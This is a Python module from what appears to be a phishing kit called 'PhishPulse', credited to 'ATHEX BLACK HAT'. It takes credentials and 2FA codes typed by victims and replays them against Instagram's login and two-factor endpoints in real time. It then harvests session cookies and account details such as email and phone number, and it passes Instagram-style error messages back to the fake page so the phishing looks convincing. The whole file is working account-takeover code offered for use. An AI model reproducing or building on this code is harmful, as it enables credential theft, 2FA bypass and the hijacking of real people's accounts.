#!/usr/bin/env python3
"""
PhishPulse - Instagram Handler
Version: 1.0
Author: ATHEX BLACK HAT

Handles: Login, 2FA (SMS/WhatsApp/Authenticator), Profile Fetch, Cookies Extraction
"""

import requests
import json
import re
import time
from datetime import datetime
from colorama import Fore, Style

class InstagramHandler:
    """Advanced Instagram API Handler"""
    
    def __init__(self):
        self.name = "Instagram"
        self.base_url = "https://www.instagram.com"
        self.api_url = "https://www.instagram.com/api/v1"
        self.user_agent_default = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        self.csrf_token = None
        self.mid = None
        self.ig_did = None
        self.ig_nrcb = None
        self.session = requests.Session()
    
    def _get_timestamp(self):
        """Get current Unix timestamp"""
        return int(datetime.now().timestamp())
    
    def _encrypt_password(self, password):
        """Instagram password encryption format"""
        timestamp = self._get_timestamp()
        return f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
    
    def _extract_cookies(self, response):
        """Extract all cookies from response"""
        cookies_dict = {}
        for cookie in response.cookies:
            cookies_dict[cookie.name] = cookie.value
        
        # Also extract from headers if available
        set_cookie_headers = response.headers.get('Set-Cookie', '')
        if set_cookie_headers:
            for cookie_str in set_cookie_headers.split(','):
                cookie_str = cookie_str.strip()
                if '=' in cookie_str:
                    parts = cookie_str.split(';')[0].split('=')
                    if len(parts) == 2:
                        cookies_dict[parts[0].strip()] = parts[1].strip()
        
        return cookies_dict
    
    def _extract_twofa_info(self, response_data):
        """Extract 2FA information from response"""
        twofa_info = response_data.get('two_factor_info', {})
        
        # Determine 2FA method
        method = None
        method_name = None
        phone_number = None
        
        if twofa_info.get('sms_two_factor_on'):
            method = 1  # SMS
            method_name = 'sms'
            phone_number = twofa_info.get('obfuscated_phone_number', '')
        elif twofa_info.get('whatsapp_two_factor_on'):
            method = 2  # WhatsApp
            method_name = 'whatsapp'
            phone_number = twofa_info.get('obfuscated_phone_number', '')
        elif twofa_info.get('totp_two_factor_on'):
            method = 3  # Authenticator App
            method_name = 'authenticator'
        
        return {
            'method': method,
            'method_name': method_name,
            'phone_number': phone_number,
            'identifier': twofa_info.get('two_factor_identifier', '')
        }
    
    def login(self, username, password, user_agent=None):
        """
        Attempt Instagram Login
        
        Args:
            username: Instagram username
            password: Plain text password
            user_agent: Browser user agent
            
        Returns:
            tuple: (result_dict, cookies_dict, profile_dict)
        """
        if not user_agent:
            user_agent = self.user_agent_default
        
        url = f"{self.api_url}/web/accounts/login/ajax/"
        
        # Step 1: Initial request to get cookies
        payload = {
            'enc_password': self._encrypt_password(password),
            'optIntoOneTap': 'false',
            'queryParams': '{}',
            'username': username
        }
        
        headers = {
            'User-Agent': user_agent.strip(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': '936619743392459',
            'X-ASBD-ID': '198387',
            'X-IG-WWW-Claim': '0',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        try:
            # First request - get initial cookies
            response = self.session.post(url, headers=headers, data=payload, timeout=30)
            
            # Extract CSRF token and other cookies
            self.csrf_token = response.cookies.get('csrftoken', '')
            self.mid = response.cookies.get('mid', '')
            self.ig_did = response.cookies.get('ig_did', '')
            self.ig_nrcb = response.cookies.get('ig_nrcb', '')
            
            # Update headers with cookies for second request
            headers.update({
                'X-CSRFToken': self.csrf_token,
                'Cookie': f"csrftoken={self.csrf_token}; mid={self.mid}; ig_did={self.ig_did}; ig_nrcb={self.ig_nrcb};"
            })
            
            # Second request - actual login
            response = self.session.post(url, headers=headers, data=payload, timeout=30)
            
            # Extract cookies
            cookies = self._extract_cookies(response)
            
            # Parse response
            try:
                result = response.json()
            except:
                result = {'user': True, 'authenticated': False, 'status': 'ok'}
            
            # Check authentication
            if result.get('authenticated'):
                # Login successful - fetch profile
                profile_info = self._fetch_profile(cookies.get('sessionid', ''))
                return result, cookies, profile_info
            
            elif result.get('two_factor_required'):
                # 2FA required
                twofa_data = self._extract_twofa_info(result)
                result['twofa_method'] = twofa_data['method_name']
                result['two_factor_identifier'] = twofa_data['identifier']
                result['phone'] = twofa_data['phone_number']
                result['message'] = self._get_2fa_message(twofa_data)
                return result, cookies, {}
            
            else:
                # Login failed
                error_message = self._extract_error_message(result)
                result['message'] = error_message
                return result, {}, {}
        
        except requests.exceptions.RequestException as e:
            return {
                'user': True, 
                'authenticated': False, 
                'status': 'ok',
                'message': 'Connection error. Please try again.'
            }, {}, {}
        
        except Exception as e:
            return {
                'user': True, 
                'authenticated': False, 
                'status': 'ok',
                'message': 'An error occurred. Please try again.'
            }, {}, {}
    
    def verify_2fa(self, code, identifier, username, user_agent=None, method='1'):
        """
        Verify Two-Factor Authentication
        
        Args:
            code: 6-digit verification code
            identifier: Two-factor identifier from login response
            username: Instagram username
            user_agent: Browser user agent
            method: 2FA method (1=SMS, 2=WhatsApp, 3=Authenticator)
            
        Returns:
            tuple: (result_dict, cookies_dict, profile_dict)
        """
        if not user_agent:
            user_agent = self.user_agent_default
        
        url = f"{self.api_url}/web/accounts/login/ajax/two_factor/"
        
        payload = {
            'identifier': identifier,
            'queryParams': '{"next":"/"}',
            'trust_signal': 'true',
            'username': username,
            'verification_method': str(method),
            'verificationCode': code
        }
        
        headers = {
            'Host': 'www.instagram.com',
            'User-Agent': user_agent.strip(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': '936619743392459',
            'X-CSRFToken': self.csrf_token or '',
            'Cookie': f"csrftoken={self.csrf_token}; mid={self.mid}; ig_did={self.ig_did}; ig_nrcb={self.ig_nrcb};",
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/two_factor/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        try:
            response = self.session.post(url, headers=headers, data=payload, timeout=30)
            
            # Extract cookies
            cookies = self._extract_cookies(response)
            
            # Parse response
            try:
                result = response.json()
            except:
                result = {'authenticated': False, 'status': 'ok'}
            
            if result.get('authenticated'):
                # 2FA successful - fetch profile
                profile_info = self._fetch_profile(cookies.get('sessionid', ''))
                return result, cookies, profile_info
            else:
                error_message = result.get('message', 'Invalid verification code.')
                result['message'] = error_message
                return result, {}, {}
        
        except Exception as e:
            return {
                'authenticated': False, 
                'status': 'ok',
                'message': 'Verification failed. Please try again.'
            }, {}, {}
    
    def _fetch_profile(self, sessionid):
        """Fetch Instagram profile information using sessionid"""
        if not sessionid:
            return {}
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Cookie': f'sessionid={sessionid}',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        try:
            # Try mobile API first
            response = requests.get(
                'https://i.instagram.com/api/v1/accounts/current_user/',
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                user_data = data.get('user', data)
                
                return {
                    'email': user_data.get('email', ''),
                    'phone': user_data.get('phone_number', ''),
                    'full_name': user_data.get('full_name', ''),
                    'bio': user_data.get('biography', ''),
                    'followers': user_data.get('follower_count', 0),
                    'following': user_data.get('following_count', 0),
                    'is_verified': user_data.get('is_verified', False),
                    'is_business': user_data.get('is_business', False),
                    'profile_pic_url': user_data.get('profile_pic_url', ''),
                    'external_url': user_data.get('external_url', ''),
                    'media_count': user_data.get('media_count', 0),
                    'username': user_data.get('username', ''),
                }
            
            # Fallback: Try web API
            response = requests.get(
                'https://www.instagram.com/api/v1/accounts/edit/web_form_data/',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Cookie': f'sessionid={sessionid}',
                    'X-CSRFToken': self.csrf_token or '',
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                form_data = data.get('form_data', {})
                
                return {
                    'email': form_data.get('email', ''),
                    'phone': form_data.get('phone_number', ''),
                    'full_name': form_data.get('full_name', ''),
                    'bio': form_data.get('biography', ''),
                    'followers': 0,
                    'following': 0,
                    'is_verified': False,
                    'is_business': False,
                }
        
        except:
            pass
        
        return {}
    
    def _get_2fa_message(self, twofa_data):
        """Get appropriate 2FA message based on method"""
        method = twofa_data.get('method_name', '')
        phone = twofa_data.get('phone_number', '')
        
        messages = {
            'sms': f'Enter the 6-digit code we sent to your number ending in {phone}',
            'whatsapp': 'Enter the 6-digit code we sent to your WhatsApp',
            'authenticator': 'Enter the 6-digit code from your authentication app',
        }
        
        return messages.get(method, 'Enter your 6-digit verification code')
    
    def _extract_error_message(self, result):
        """Extract human-readable error message"""
        message = result.get('message', '')
        
        error_messages = {
            'checkpoint_required': 'Your account requires verification. Please check your email.',
            'challenge_required': 'Security challenge required. Please try again.',
            'invalid_user': 'The username you entered doesn\'t appear to belong to an account.',
            'invalid_password': 'The password you entered is incorrect. Please try again.',
            'rate_limit_error': 'Too many attempts. Please try again later.',
            'The password you entered is incorrect': 'The password you entered is incorrect. Please try again.',
        }
        
        for key, value in error_messages.items():
            if key.lower() in message.lower():
                return value
        
        if 'incorrect' in message.lower() or 'invalid' in message.lower():
            return 'The password you entered is incorrect. Please try again.'
        
        if 'checkpoint' in message.lower():
            return 'Your account requires additional verification.'
        
        return 'Invalid credentials. Please try again.'
    
    def check_username(self, username):
        """Check if Instagram username exists"""
        try:
            response = requests.get(
                f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}',
                headers={'User-Agent': self.user_agent_default},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('data', {}).get('user') is not None
            
            return False
        except:
            return None